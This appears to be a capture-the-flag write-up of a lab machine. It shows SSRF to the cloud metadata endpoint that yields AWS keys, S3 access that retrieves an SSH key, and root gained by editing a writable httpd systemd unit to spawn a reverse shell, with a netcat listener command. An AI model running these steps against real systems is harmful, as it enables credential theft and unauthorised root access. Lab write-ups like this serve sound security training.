## Enumeration

`curl -I 172.16.10.21`

![evasion](/static/images/iam-writeup-images/image.png)

This Apache version is vulnerable to SSRF.

![evasion 1](/static/images/iam-writeup-images/image1.png)

After that, we listed the `/latest` directory.

![evasion 2](/static/images/iam-writeup-images/image2.png)

Then the `/iam` directory.

![evasion 3](/static/images/iam-writeup-images/image3.png)

Then inside `/security-credentials`.

![evasion 4](/static/images/iam-writeup-images/image4.png)

Finally, in `MACHINE_IAM_ROLE`

![evasion 5](/static/images/iam-writeup-images/image5.png)

With that, we have access to the AWS keys.

![evasion 6](/static/images/iam-writeup-images/image6.png)

## Foot Hold

With the credentials, it was possible to log into the application using **aws-cli**.

```
export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_SESSION_TOKEN=
```

![evasion 7](/static/images/iam-writeup-images/image7.png)

Listing the bucket, we can grab the first flag and the SSH key for the **op** user.

```bash
aws s3 ls s3://machine-iam-bucket
aws s3 cp s3://machina-iam-bucket/op-user-key.pem .
```

![evasion 8](/static/images/iam-writeup-images/image8.png)

```bash
chmod 600 op-user-key.pem
ssh op@172.16.10.21 -i op-user-key.pem
```

![evasion 9](/static/images/iam-writeup-images/image9.png)

## Privilege Escalation

`sudo -l`

We can run `httpd` and `daemon-reload` as root without a password.

![evasion 10](/static/images/iam-writeup-images/image10.png)

Looking at the **httpd** service configuration file, we have write permissions, which we can use to gain root access on the machine.

![evasion 11](/static/images/iam-writeup-images/image11.png)

```bash
nano /usr/lib/systemd/system/httpd.service
```

We modify the `ExecStart` line to spawn a reverse shell when we restart the service.

![evasion 12](/static/images/iam-writeup-images/image12.png)

After that, just activate the listener and run the command `sudo /bin/systemctl restart httpd`

```bash
nc -lnvp 1337
```
